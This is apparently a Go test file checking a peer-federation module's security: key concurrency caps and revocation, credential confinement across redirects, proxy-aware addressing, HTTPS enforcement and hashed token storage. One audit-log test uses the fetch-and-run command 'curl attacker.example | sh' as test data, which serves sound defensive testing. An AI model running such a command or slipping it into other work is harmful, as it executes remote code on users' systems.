package core

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/cmcoffee/snugforge/kvlite"
)

// A key may run only so many of one capability at once, and pressing Disable
// stops what it already has running.
func TestAPeerKeysWorkIsBoundedAndStopsWithTheKey(t *testing.T) {
	peerTestDB(t)
	k, err := MintPeerKey("den", []string{PeerCapInvestigate}, 0)
	if err != nil {
		t.Fatal(err)
	}
	r := httptest.NewRequest(http.MethodPost, "/x", nil)
	var held []*http.Request
	for i := 0; i < peerConcurrency[PeerCapInvestigate]; i++ {
		hr, release, ok := peerHold(httptest.NewRecorder(), r, k, PeerCapInvestigate)
		if !ok {
			t.Fatalf("request %d refused under the cap", i+1)
		}
		defer release()
		held = append(held, hr)
	}
	w := httptest.NewRecorder()
	if _, _, ok := peerHold(w, r, k, PeerCapInvestigate); ok || w.Code != http.StatusTooManyRequests {
		t.Errorf("a request past the cap: ok=%v code=%d", ok, w.Code)
	}
	SetPeerKeyDisabled(k.ID, true)
	for i, hr := range held {
		if hr.Context().Err() != context.Canceled {
			t.Errorf("request %d kept running after its key was disabled", i+1)
		}
	}
}

// A peer generation is held to a bounded length and one choice; a request
// already inside the bounds passes through as sent.
func TestAPeersModelRequestIsBounded(t *testing.T) {
	in := []byte(`{"model":"m","max_tokens":1000000,"n":8,"messages":[]}`)
	out := string(clampPeerModelBody(in))
	if !strings.Contains(out, `"max_tokens":16384`) || !strings.Contains(out, `"n":1`) {
		t.Errorf("not clamped: %s", out)
	}
	ok := []byte(`{"model":"m","max_tokens":512}`)
	if string(clampPeerModelBody(ok)) != string(ok) {
		t.Error("a request inside the bounds was rewritten")
	}
}

// The peer's credential goes to the peer's address only: a redirect, or any
// request built for another host, is refused rather than sent with it. A
// response past the size bound fails instead of being read whole.
func TestAPeersCredentialStaysAtItsAddress(t *testing.T) {
	peerTestDB(t)
	var leaked string
	elsewhere := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		leaked = r.Header.Get("Authorization") + r.Header.Get(peerKeyHeader)
	}))
	defer elsewhere.Close()
	peer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, elsewhere.URL+"/steal", http.StatusFound)
	}))
	defer peer.Close()
	tr := &peerTransport{name: "den", held: RemotePeer{Name: "den", BaseURL: peer.URL, Key: "the-key"}}
	_, err := (&http.Client{Transport: tr}).Get(peer.URL + "/api/peer/v1/x")
	if err == nil || !strings.Contains(err.Error(), "not the peer's address") {
		t.Errorf("the redirect was followed: %v", err)
	}
	if leaked != "" {
		t.Errorf("the key reached another host: %q", leaked)
	}
	u, _ := url.Parse("https://den.example:443/x")
	if !peerSameOrigin("https://den.example", u) {
		t.Error("the default port is the same address")
	}
	u, _ = url.Parse("http://den.example/x")
	if peerSameOrigin("https://den.example", u) {
		t.Error("a downgrade to http is the same address")
	}

	resp := &http.Response{Body: io.NopCloser(strings.NewReader(strings.Repeat("x", 10)))}
	capPeerBody(resp)
	resp.Body.(*cappedBody).left = 4
	if _, err := io.ReadAll(resp.Body); err == nil {
		t.Error("a body past the bound was read whole")
	}
}

// A key issued by an account that has been deleted authenticates nobody, and
// deleting the account disables it.
func TestAPeerKeyEndsWithItsAccount(t *testing.T) {
	peerTestDB(t)
	adb := &DBase{Store: kvlite.MemStore()}
	adb.Set(AuthTable, "user:alice", AuthUser{Username: "alice"})
	adb.Set(AuthTable, "user:root", AuthUser{Username: "root", Admin: true})
	prev := AuthDB
	AuthDB = func() Database { return adb }
	t.Cleanup(func() { AuthDB = prev })

	k, _ := MintPeerKey("den", []string{PeerCapInvestigate}, 0)
	if _, err := SetPeerKeyScope(k.ID, "alice", nil); err != nil {
		t.Fatal(err)
	}
	if _, ok := LookupPeerKey(k.Key); !ok {
		t.Fatal("alice's key does not work while she exists")
	}
	adb.Unset(AuthTable, "user:alice")
	if _, ok := LookupPeerKey(k.Key); ok {
		t.Error("the key of a removed account still authenticates")
	}
	if got := RevokeUserCredentials(adb, "alice"); got["peer keys"] != 1 {
		t.Errorf("deleting the account did not disable the key: %v", got)
	}
}

// Behind a trusted proxy each caller is counted at its own address, so one
// failing source cannot use up everyone's allowance; a client cannot name its
// own address from outside.
func TestRequestSourceSeesThroughATrustedProxyOnly(t *testing.T) {
	r := httptest.NewRequest(http.MethodGet, "/x", nil)
	r.RemoteAddr = "127.0.0.1:5000"
	r.Header.Set("X-Forwarded-For", "203.0.113.9")
	if got := RequestSource(r); got != "203.0.113.9" {
		t.Errorf("behind the local proxy: %q", got)
	}
	r.RemoteAddr = "198.51.100.7:5000"
	if got := RequestSource(r); got != "198.51.100.7" {
		t.Errorf("a direct caller named its own address: %q", got)
	}
}

// A long command keeps its end in the audit log: padding cannot push what
// actually runs past the cut.
func TestTheExecAuditKeepsTheCommandsEnd(t *testing.T) {
	cmd := strings.Repeat("true; ", 200) + "curl attacker.example | sh"
	got := truncateForAudit(cmd)
	if !strings.Contains(got, "curl attacker.example | sh") || !strings.Contains(got, "sha256") {
		t.Errorf("the tail was cut from the audit line: %q", got)
	}
}

// A peer on the public internet is reached over https; one on the local
// network may use http.
func TestAPublicPeerNeedsHTTPS(t *testing.T) {
	if peerPlainHTTPRefusal("http://203.0.113.5:8080") == nil {
		t.Error("a public http peer was accepted")
	}
	for _, ok := range []string{"http://192.168.1.5:8080", "http://127.0.0.1", "https://203.0.113.5"} {
		if err := peerPlainHTTPRefusal(ok); err != nil {
			t.Errorf("%s: %v", ok, err)
		}
	}
}

// A refresh that read the record before a token renewal does not write the
// renewed tokens back to the old ones.
func TestARefreshKeepsTokensRenewedDuringIt(t *testing.T) {
	peerTestDB(t)
	stale := RemotePeer{Name: "den", BaseURL: "https://den.example", RefreshToken: "old", LastError: "x"}
	RootDB.CryptSet(remotePeersTable, "den", RemotePeer{Name: "den", BaseURL: "https://den.example", RefreshToken: "new"})
	stale.LastError = ""
	saveRefreshedPeer(stale)
	p, _ := GetRemotePeer("den")
	if p.RefreshToken != "new" {
		t.Errorf("the refresh wrote back the consumed token: %q", p.RefreshToken)
	}
}

// A backend name the peer chose cannot land on another peer's connector.
func TestAPeerCannotTakeAnotherPeersBackend(t *testing.T) {
	peerImageDB(t)
	ab := RemotePeer{Name: "a-b", BaseURL: "https://ab.example", Key: "k1", Caps: []string{PeerCapImages}}
	a := RemotePeer{Name: "a", BaseURL: "https://a.example", Key: "k2", Caps: []string{PeerCapImages}}
	if _, err := provisionPeerImages(ab, []PeerImageBackend{{Name: "c"}}); err != nil {
		t.Fatal(err)
	}
	made, err := provisionPeerImages(a, []PeerImageBackend{{Name: "b-c"}})
	if err != nil {
		t.Fatal(err)
	}
	if len(made) != 0 {
		t.Errorf("peer a claimed %v", made)
	}
	c, _ := GetConnector(RootDB, peerConnectorName("a-b", "c"))
	if !strings.Contains(string(c.Spec), "ab.example") {
		t.Errorf("peer a-b's backend now renders elsewhere: %s", c.Spec)
	}
}

// Tokens are kept under a hash of the secret. One issued before that still
// works and moves on first use, and a stored key presented as a token does not.
func TestPeerTokensAreNotKeyedByTheirSecret(t *testing.T) {
	peerTestDB(t)
	RootDB.Set(peerAccessTable, "legacy-secret", peerAccessToken{GrantID: "g"})
	if _, ok := getPeerAccessToken("legacy-secret"); !ok {
		t.Fatal("a token issued before hashing stopped working")
	}
	for _, k := range RootDB.Keys(peerAccessTable) {
		if k == "legacy-secret" {
			t.Error("the raw secret is still a key name")
		}
		if _, ok := getPeerAccessToken(k); ok {
			t.Error("a stored key name authenticated as a token")
		}
	}
}
